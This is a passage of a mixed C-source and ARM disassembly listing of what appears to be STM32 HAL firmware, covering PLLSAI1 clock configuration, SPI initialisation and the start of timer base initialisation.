 8004c4e:	4b53      	ldr	r3, [pc, #332]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c50:	681b      	ldr	r3, [r3, #0]
 8004c52:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004c56:	2b00      	cmp	r3, #0
 8004c58:	d109      	bne.n	8004c6e <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004c5a:	2301      	movs	r3, #1
 8004c5c:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004c5e:	e006      	b.n	8004c6e <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004c60:	2301      	movs	r3, #1
 8004c62:	73fb      	strb	r3, [r7, #15]
      break;
 8004c64:	e004      	b.n	8004c70 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c66:	bf00      	nop
 8004c68:	e002      	b.n	8004c70 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c6a:	bf00      	nop
 8004c6c:	e000      	b.n	8004c70 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004c6e:	bf00      	nop
    }

    if(status == HAL_OK)
 8004c70:	7bfb      	ldrb	r3, [r7, #15]
 8004c72:	2b00      	cmp	r3, #0
 8004c74:	d10d      	bne.n	8004c92 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004c76:	4b49      	ldr	r3, [pc, #292]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c78:	68db      	ldr	r3, [r3, #12]
 8004c7a:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004c7e:	687b      	ldr	r3, [r7, #4]
 8004c80:	6819      	ldr	r1, [r3, #0]
 8004c82:	687b      	ldr	r3, [r7, #4]
 8004c84:	685b      	ldr	r3, [r3, #4]
 8004c86:	3b01      	subs	r3, #1
 8004c88:	011b      	lsls	r3, r3, #4
 8004c8a:	430b      	orrs	r3, r1
 8004c8c:	4943      	ldr	r1, [pc, #268]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c8e:	4313      	orrs	r3, r2
 8004c90:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004c92:	7bfb      	ldrb	r3, [r7, #15]
 8004c94:	2b00      	cmp	r3, #0
 8004c96:	d17c      	bne.n	8004d92 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004c98:	4b40      	ldr	r3, [pc, #256]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c9a:	681b      	ldr	r3, [r3, #0]
 8004c9c:	4a3f      	ldr	r2, [pc, #252]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c9e:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004ca2:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004ca4:	f7fc fbc8 	bl	8001438 <HAL_GetTick>
 8004ca8:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004caa:	e009      	b.n	8004cc0 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004cac:	f7fc fbc4 	bl	8001438 <HAL_GetTick>
 8004cb0:	4602      	mov	r2, r0
 8004cb2:	68bb      	ldr	r3, [r7, #8]
 8004cb4:	1ad3      	subs	r3, r2, r3
 8004cb6:	2b02      	cmp	r3, #2
 8004cb8:	d902      	bls.n	8004cc0 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004cba:	2303      	movs	r3, #3
 8004cbc:	73fb      	strb	r3, [r7, #15]
        break;
 8004cbe:	e005      	b.n	8004ccc <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004cc0:	4b36      	ldr	r3, [pc, #216]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cc2:	681b      	ldr	r3, [r3, #0]
 8004cc4:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004cc8:	2b00      	cmp	r3, #0
 8004cca:	d1ef      	bne.n	8004cac <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004ccc:	7bfb      	ldrb	r3, [r7, #15]
 8004cce:	2b00      	cmp	r3, #0
 8004cd0:	d15f      	bne.n	8004d92 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004cd2:	683b      	ldr	r3, [r7, #0]
 8004cd4:	2b00      	cmp	r3, #0
 8004cd6:	d110      	bne.n	8004cfa <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004cd8:	4b30      	ldr	r3, [pc, #192]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cda:	691b      	ldr	r3, [r3, #16]
 8004cdc:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004ce0:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004ce4:	687a      	ldr	r2, [r7, #4]
 8004ce6:	6892      	ldr	r2, [r2, #8]
 8004ce8:	0211      	lsls	r1, r2, #8
 8004cea:	687a      	ldr	r2, [r7, #4]
 8004cec:	68d2      	ldr	r2, [r2, #12]
 8004cee:	06d2      	lsls	r2, r2, #27
 8004cf0:	430a      	orrs	r2, r1
 8004cf2:	492a      	ldr	r1, [pc, #168]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cf4:	4313      	orrs	r3, r2
 8004cf6:	610b      	str	r3, [r1, #16]
 8004cf8:	e027      	b.n	8004d4a <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004cfa:	683b      	ldr	r3, [r7, #0]
 8004cfc:	2b01      	cmp	r3, #1
 8004cfe:	d112      	bne.n	8004d26 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004d00:	4b26      	ldr	r3, [pc, #152]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d02:	691b      	ldr	r3, [r3, #16]
 8004d04:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004d08:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004d0c:	687a      	ldr	r2, [r7, #4]
 8004d0e:	6892      	ldr	r2, [r2, #8]
 8004d10:	0211      	lsls	r1, r2, #8
 8004d12:	687a      	ldr	r2, [r7, #4]
 8004d14:	6912      	ldr	r2, [r2, #16]
 8004d16:	0852      	lsrs	r2, r2, #1
 8004d18:	3a01      	subs	r2, #1
 8004d1a:	0552      	lsls	r2, r2, #21
 8004d1c:	430a      	orrs	r2, r1
 8004d1e:	491f      	ldr	r1, [pc, #124]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d20:	4313      	orrs	r3, r2
 8004d22:	610b      	str	r3, [r1, #16]
 8004d24:	e011      	b.n	8004d4a <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004d26:	4b1d      	ldr	r3, [pc, #116]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d28:	691b      	ldr	r3, [r3, #16]
 8004d2a:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004d2e:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004d32:	687a      	ldr	r2, [r7, #4]
 8004d34:	6892      	ldr	r2, [r2, #8]
 8004d36:	0211      	lsls	r1, r2, #8
 8004d38:	687a      	ldr	r2, [r7, #4]
 8004d3a:	6952      	ldr	r2, [r2, #20]
 8004d3c:	0852      	lsrs	r2, r2, #1
 8004d3e:	3a01      	subs	r2, #1
 8004d40:	0652      	lsls	r2, r2, #25
 8004d42:	430a      	orrs	r2, r1
 8004d44:	4915      	ldr	r1, [pc, #84]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d46:	4313      	orrs	r3, r2
 8004d48:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004d4a:	4b14      	ldr	r3, [pc, #80]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d4c:	681b      	ldr	r3, [r3, #0]
 8004d4e:	4a13      	ldr	r2, [pc, #76]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d50:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004d54:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004d56:	f7fc fb6f 	bl	8001438 <HAL_GetTick>
 8004d5a:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004d5c:	e009      	b.n	8004d72 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004d5e:	f7fc fb6b 	bl	8001438 <HAL_GetTick>
 8004d62:	4602      	mov	r2, r0
 8004d64:	68bb      	ldr	r3, [r7, #8]
 8004d66:	1ad3      	subs	r3, r2, r3
 8004d68:	2b02      	cmp	r3, #2
 8004d6a:	d902      	bls.n	8004d72 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004d6c:	2303      	movs	r3, #3
 8004d6e:	73fb      	strb	r3, [r7, #15]
          break;
 8004d70:	e005      	b.n	8004d7e <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004d72:	4b0a      	ldr	r3, [pc, #40]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d74:	681b      	ldr	r3, [r3, #0]
 8004d76:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004d7a:	2b00      	cmp	r3, #0
 8004d7c:	d0ef      	beq.n	8004d5e <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004d7e:	7bfb      	ldrb	r3, [r7, #15]
 8004d80:	2b00      	cmp	r3, #0
 8004d82:	d106      	bne.n	8004d92 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004d84:	4b05      	ldr	r3, [pc, #20]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d86:	691a      	ldr	r2, [r3, #16]
 8004d88:	687b      	ldr	r3, [r7, #4]
 8004d8a:	699b      	ldr	r3, [r3, #24]
 8004d8c:	4903      	ldr	r1, [pc, #12]	; (8004d9c <RCCEx_PLLSAI1_Config+0x1e0>)
 8004d8e:	4313      	orrs	r3, r2
 8004d90:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004d92:	7bfb      	ldrb	r3, [r7, #15]
}
 8004d94:	4618      	mov	r0, r3
 8004d96:	3710      	adds	r7, #16
 8004d98:	46bd      	mov	sp, r7
 8004d9a:	bd80      	pop	{r7, pc}
 8004d9c:	40021000 	.word	0x40021000

08004da0 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004da0:	b580      	push	{r7, lr}
 8004da2:	b084      	sub	sp, #16
 8004da4:	af00      	add	r7, sp, #0
 8004da6:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004da8:	687b      	ldr	r3, [r7, #4]
 8004daa:	2b00      	cmp	r3, #0
 8004dac:	d101      	bne.n	8004db2 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004dae:	2301      	movs	r3, #1
 8004db0:	e095      	b.n	8004ede <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004db2:	687b      	ldr	r3, [r7, #4]
 8004db4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004db6:	2b00      	cmp	r3, #0
 8004db8:	d108      	bne.n	8004dcc <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004dba:	687b      	ldr	r3, [r7, #4]
 8004dbc:	685b      	ldr	r3, [r3, #4]
 8004dbe:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004dc2:	d009      	beq.n	8004dd8 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004dc4:	687b      	ldr	r3, [r7, #4]
 8004dc6:	2200      	movs	r2, #0
 8004dc8:	61da      	str	r2, [r3, #28]
 8004dca:	e005      	b.n	8004dd8 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004dcc:	687b      	ldr	r3, [r7, #4]
 8004dce:	2200      	movs	r2, #0
 8004dd0:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004dd2:	687b      	ldr	r3, [r7, #4]
 8004dd4:	2200      	movs	r2, #0
 8004dd6:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004dd8:	687b      	ldr	r3, [r7, #4]
 8004dda:	2200      	movs	r2, #0
 8004ddc:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004de4:	b2db      	uxtb	r3, r3
 8004de6:	2b00      	cmp	r3, #0
 8004de8:	d106      	bne.n	8004df8 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004dea:	687b      	ldr	r3, [r7, #4]
 8004dec:	2200      	movs	r2, #0
 8004dee:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004df2:	6878      	ldr	r0, [r7, #4]
 8004df4:	f7fc f8cc 	bl	8000f90 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004df8:	687b      	ldr	r3, [r7, #4]
 8004dfa:	2202      	movs	r2, #2
 8004dfc:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004e00:	687b      	ldr	r3, [r7, #4]
 8004e02:	681b      	ldr	r3, [r3, #0]
 8004e04:	681a      	ldr	r2, [r3, #0]
 8004e06:	687b      	ldr	r3, [r7, #4]
 8004e08:	681b      	ldr	r3, [r3, #0]
 8004e0a:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004e0e:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004e10:	687b      	ldr	r3, [r7, #4]
 8004e12:	68db      	ldr	r3, [r3, #12]
 8004e14:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004e18:	d902      	bls.n	8004e20 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004e1a:	2300      	movs	r3, #0
 8004e1c:	60fb      	str	r3, [r7, #12]
 8004e1e:	e002      	b.n	8004e26 <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004e20:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004e24:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004e26:	687b      	ldr	r3, [r7, #4]
 8004e28:	68db      	ldr	r3, [r3, #12]
 8004e2a:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004e2e:	d007      	beq.n	8004e40 <HAL_SPI_Init+0xa0>
 8004e30:	687b      	ldr	r3, [r7, #4]
 8004e32:	68db      	ldr	r3, [r3, #12]
 8004e34:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004e38:	d002      	beq.n	8004e40 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004e3a:	687b      	ldr	r3, [r7, #4]
 8004e3c:	2200      	movs	r2, #0
 8004e3e:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004e40:	687b      	ldr	r3, [r7, #4]
 8004e42:	685b      	ldr	r3, [r3, #4]
 8004e44:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004e48:	687b      	ldr	r3, [r7, #4]
 8004e4a:	689b      	ldr	r3, [r3, #8]
 8004e4c:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004e50:	431a      	orrs	r2, r3
 8004e52:	687b      	ldr	r3, [r7, #4]
 8004e54:	691b      	ldr	r3, [r3, #16]
 8004e56:	f003 0302 	and.w	r3, r3, #2
 8004e5a:	431a      	orrs	r2, r3
 8004e5c:	687b      	ldr	r3, [r7, #4]
 8004e5e:	695b      	ldr	r3, [r3, #20]
 8004e60:	f003 0301 	and.w	r3, r3, #1
 8004e64:	431a      	orrs	r2, r3
 8004e66:	687b      	ldr	r3, [r7, #4]
 8004e68:	699b      	ldr	r3, [r3, #24]
 8004e6a:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004e6e:	431a      	orrs	r2, r3
 8004e70:	687b      	ldr	r3, [r7, #4]
 8004e72:	69db      	ldr	r3, [r3, #28]
 8004e74:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004e78:	431a      	orrs	r2, r3
 8004e7a:	687b      	ldr	r3, [r7, #4]
 8004e7c:	6a1b      	ldr	r3, [r3, #32]
 8004e7e:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004e82:	ea42 0103 	orr.w	r1, r2, r3
 8004e86:	687b      	ldr	r3, [r7, #4]
 8004e88:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004e8a:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004e8e:	687b      	ldr	r3, [r7, #4]
 8004e90:	681b      	ldr	r3, [r3, #0]
 8004e92:	430a      	orrs	r2, r1
 8004e94:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004e96:	687b      	ldr	r3, [r7, #4]
 8004e98:	699b      	ldr	r3, [r3, #24]
 8004e9a:	0c1b      	lsrs	r3, r3, #16
 8004e9c:	f003 0204 	and.w	r2, r3, #4
 8004ea0:	687b      	ldr	r3, [r7, #4]
 8004ea2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004ea4:	f003 0310 	and.w	r3, r3, #16
 8004ea8:	431a      	orrs	r2, r3
 8004eaa:	687b      	ldr	r3, [r7, #4]
 8004eac:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004eae:	f003 0308 	and.w	r3, r3, #8
 8004eb2:	431a      	orrs	r2, r3
 8004eb4:	687b      	ldr	r3, [r7, #4]
 8004eb6:	68db      	ldr	r3, [r3, #12]
 8004eb8:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004ebc:	ea42 0103 	orr.w	r1, r2, r3
 8004ec0:	68fb      	ldr	r3, [r7, #12]
 8004ec2:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004ec6:	687b      	ldr	r3, [r7, #4]
 8004ec8:	681b      	ldr	r3, [r3, #0]
 8004eca:	430a      	orrs	r2, r1
 8004ecc:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004ece:	687b      	ldr	r3, [r7, #4]
 8004ed0:	2200      	movs	r2, #0
 8004ed2:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004ed4:	687b      	ldr	r3, [r7, #4]
 8004ed6:	2201      	movs	r2, #1
 8004ed8:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004edc:	2300      	movs	r3, #0
}
 8004ede:	4618      	mov	r0, r3
 8004ee0:	3710      	adds	r7, #16
 8004ee2:	46bd      	mov	sp, r7
 8004ee4:	bd80      	pop	{r7, pc}

08004ee6 <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004ee6:	b580      	push	{r7, lr}
 8004ee8:	b082      	sub	sp, #8
 8004eea:	af00      	add	r7, sp, #0
 8004eec:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004eee:	687b      	ldr	r3, [r7, #4]
 8004ef0:	2b00      	cmp	r3, #0
 8004ef2:	d101      	bne.n	8004ef8 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004ef4:	2301      	movs	r3, #1
 8004ef6:	e049      	b.n	8004f8c <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004ef8:	687b      	ldr	r3, [r7, #4]
 8004efa:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004efe:	b2db      	uxtb	r3, r3
 8004f00:	2b00      	cmp	r3, #0
 8004f02:	d106      	bne.n	8004f12 <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004f04:	687b      	ldr	r3, [r7, #4]
 8004f06:	2200      	movs	r2, #0
 8004f08:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004f0c:	6878      	ldr	r0, [r7, #4]
 8004f0e:	f7fc f943 	bl	8001198 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004f12:	687b      	ldr	r3, [r7, #4]
 8004f14:	2202      	movs	r2, #2
 8004f16:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004f1a:	687b      	ldr	r3, [r7, #4]
 8004f1c:	681a      	ldr	r2, [r3, #0]
 8004f1e:	687b      	ldr	r3, [r7, #4]
 8004f20:	3304      	adds	r3, #4
 8004f22:	4619      	mov	r1, r3
 8004f24:	4610      	mov	r0, r2
 8004f26:	f000 fa7d 	bl	8005424 <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004f2a:	687b      	ldr	r3, [r7, #4]
 8004f2c:	2201      	movs	r2, #1
 8004f2e:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004f32:	687b      	ldr	r3, [r7, #4]
 8004f34:	2201      	movs	r2, #1
 8004f36:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004f3a:	687b      	ldr	r3, [r7, #4]
 8004f3c:	2201      	movs	r2, #1
 8004f3e:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004f42:	687b      	ldr	r3, [r7, #4]
 8004f44:	2201      	movs	r2, #1
 8004f46:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004f4a:	687b      	ldr	r3, [r7, #4]
 8004f4c:	2201      	movs	r2, #1
 8004f4e:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004f52:	687b      	ldr	r3, [r7, #4]
 8004f54:	2201      	movs	r2, #1
 8004f56:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004f5a:	687b      	ldr	r3, [r7, #4]
 8004f5c:	2201      	movs	r2, #1
 8004f5e:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004f62:	687b      	ldr	r3, [r7, #4]
 8004f64:	2201      	movs	r2, #1
 8004f66:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004f6a:	687b      	ldr	r3, [r7, #4]
 8004f6c:	2201      	movs	r2, #1
 8004f6e:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004f72:	687b      	ldr	r3, [r7, #4]
 8004f74:	2201      	movs	r2, #1
 8004f76:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004f7a:	687b      	ldr	r3, [r7, #4]
